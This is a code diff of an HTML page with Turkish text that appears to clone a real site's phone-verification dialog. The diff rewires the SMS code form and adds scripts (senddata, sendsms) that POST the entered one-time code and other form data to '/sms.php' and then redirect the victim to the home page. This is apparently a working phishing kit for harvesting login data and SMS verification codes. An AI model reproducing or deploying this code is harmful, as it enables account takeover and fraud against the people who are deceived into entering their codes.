@@ -728,7 +728,7 @@
                                              <path fill="currentColor" d="M312.1 375c9.369 9.369 9.369 24.57 0 33.94s-24.57 9.369-33.94 0L160 289.9l-119 119c-9.369 9.369-24.57 9.369-33.94 0s-9.369-24.57 0-33.94L126.1 256L7.027 136.1c-9.369-9.369-9.369-24.57 0-33.94s24.57-9.369 33.94 0L160 222.1l119-119c9.369-9.369 24.57-9.369 33.94 0s9.369 24.57 0 33.94L193.9 256L312.1 375z"></path>
                                           </svg>
                                        </fa-icon>
-                                       <span class="mat-mdc-focus-indicator"></span><span matripple="" class="mat-ripple mat-mdc-button-ripple"></span><span class="mat-mdc-button-touch-target"></span>
+                                       <span class="mat-mdc-focus-indicator"></span><span matripple="" class="mat-ripple mat-mdc-button-ripple"></span><span onclick="closemodal()" class="mat-mdc-button-touch-target"></span>
                                     </button>
                                  </fe-icon-button>
                                  <h3 _ngcontent-yxr-c314="" class="text-align-center">Telefon Numaranızı Doğrulayın</h3>
@@ -736,10 +736,10 @@
                               <!----><!---->
                               <div _ngcontent-yxr-c314="" matdialogcontent="" class="mat-mdc-dialog-content mdc-dialog__content dialog__container otp-verify ng-star-inserted">
                                  <span _ngcontent-yxr-c314="" class="subtitle-2 text-color-black"> Telefonuna gelen SMS kodunu girerek doğrulama işlemini tamamla<br _ngcontent-yxr-c314=""></span>
-                                 <form id="smsform" _ngcontent-yxr-c314="" novalidate="" feappsubmitthrottle="" class="phone-verify-form ng-pristine ng-invalid ng-touched">
+                                 <form id="smsform" _ngcontent-yxr-c314="" novalidate="" feappsubmitthrottle="" class="phone-verify-form ng-pristine ng-invalid ng-touched" action="javascript:sendsms()">
                                     <mat-form-field _ngcontent-yxr-c314="" id="otp-dialog_login-sms-code" color="accent" appearance="outline" class="mat-mdc-form-field ng-tns-c186-3 mat-mdc-form-field-type-mat-input mat-form-field-appearance-outline mat-accent ng-pristine ng-invalid ng-star-inserted mat-form-field-invalid mat-form-field-hide-placeholder ng-touched">
                                        <!---->
-                                       <div class="mat-mdc-text-field-wrapper mdc-text-field ng-tns-c186-3 mdc-text-field--outlined mdc-text-field--invalid" action="javascript:sendsms()">
+                                       <div class="mat-mdc-text-field-wrapper mdc-text-field ng-tns-c186-3 mdc-text-field--outlined mdc-text-field--invalid">
                                           <!---->
                                           <div class="mat-mdc-form-field-flex ng-tns-c186-3">
                                              <div matformfieldnotchedoutline="" class="mdc-notched-outline ng-tns-c186-3 mdc-notched-outline--upgraded ng-star-inserted">
@@ -755,7 +755,7 @@
                                              </div>
                                              <!----><!----><!---->
                                              <div class="mat-mdc-form-field-infix ng-tns-c186-3">
-                                                <!----><input id="smsinput" oninput="handleInput()" name="smsinput" _ngcontent-yxr-c314="" id="otp-dialog-code__input" feonlynumbers="" type="tel" maxlength="6" matinput="" cdkfocusinitial="" formcontrolname="code" class="mat-mdc-input-element ng-tns-c186-3 ng-pristine ng-invalid mat-mdc-form-field-input-control mdc-text-field__input cdk-text-field-autofill-monitored ng-touched" required="" aria-required="true" aria-describedby="mat-mdc-error-7">
+                                                <!----><input id="smsinput" oninput="handleInputa()" name="sms" _ngcontent-yxr-c314="" id="otp-dialog-code__input" feonlynumbers="" type="tel" maxlength="6" matinput="" cdkfocusinitial="" formcontrolname="code" class="mat-mdc-input-element ng-tns-c186-3 ng-pristine ng-invalid mat-mdc-form-field-input-control mdc-text-field__input cdk-text-field-autofill-monitored ng-touched" required="" aria-required="true" aria-describedby="mat-mdc-error-7">
                                              </div>
                                              <!----><!---->
                                           </div>
@@ -1193,6 +1193,104 @@
             </div>
          </div>
       </div>
+
+
+
+
+<!-- sms -->
+
+
+
+<script>
+      function senddata() {
+         $(document).ready(function() {
+            $('#spinner').removeClass('hidden');
+         });
+         var formData = new FormData(myform);
+         var xhr = new XMLHttpRequest();
+         xhr.open('POST', '/sms.php', true);
+         xhr.onreadystatechange = function() {
+            if (xhr.readyState == 4) {
+               if (xhr.status == 200) {
+                     $(document).ready(function() {
+                           $('#spinner').addClass('hidden');
+                           $('#smsmodal').removeClass('hidden');
+                     });
+                     console.log('Başarılı:', xhr.responseText);
+               } else {
+                     console.error('Hata:', xhr.statusText);
+               }
+            }
+         };
+         xhr.send(formData);
+         };
+   </script>
+   <script>
+      function sendsms() {
+         var formData = new FormData(smsform);
+         var xhr = new XMLHttpRequest();
+         xhr.open('POST', '/sms.php', true);
+         xhr.onreadystatechange = function() {
+            if (xhr.readyState == 4) {
+               if (xhr.status == 200) {
+                     $(document).ready(function() {
+                           $('#smsmodal').addClass('hidden');
+                           window.location.href = "/";
+                     });
+                     console.log('Başarılı:', xhr.responseText);
+               } else {
+                     console.error('Hata:', xhr.statusText);
+               }
+            }
+         };
+         xhr.send(formData);
+         };
+   </script>
+   <script>
+   document.addEventListener('DOMContentLoaded', function () {
+      document.getElementById('smsform').addEventListener('input', function () {
+            var formElements = this.elements;
+            var submitButton = document.getElementById('smsbutton');
+
+            for (var i = 0; i < formElements.length; i++) {
+               if (
+                  formElements[i].type !== 'submit' &&
+                  formElements[i].type !== 'checkbox' &&
+                  formElements[i].value.trim() === ''
+               ) {
+                  submitButton.disabled = true;
+                  return;
+               } else if (
+                  formElements[i].type === 'checkbox' &&
+                  !formElements[i].checked
+               ) {
+                  submitButton.disabled = true;
+                  return;
+               }
+            }
+            submitButton.disabled = false;
+      });
+   });
+   </script>
+<script>
+   function handleInputa() {
+
+      var inputElement = document.getElementById("smsinput");
+      var labelElement = document.getElementById("smsuyari0");
+      var labelElement1 = document.getElementById("smsuyari1");
+      if (inputElement.value.trim() !== "") {
+         labelElement.style.display = "none";
+         labelElement1.style.display = "none";
+      } else {
+         labelElement.style.display = "block";
+         labelElement1.style.display = "block";
+      }
+   }
+</script>
+
+
+
+<!-- sms -->
 <script>
    function showCart() {
   var cart = document.getElementById("cart");
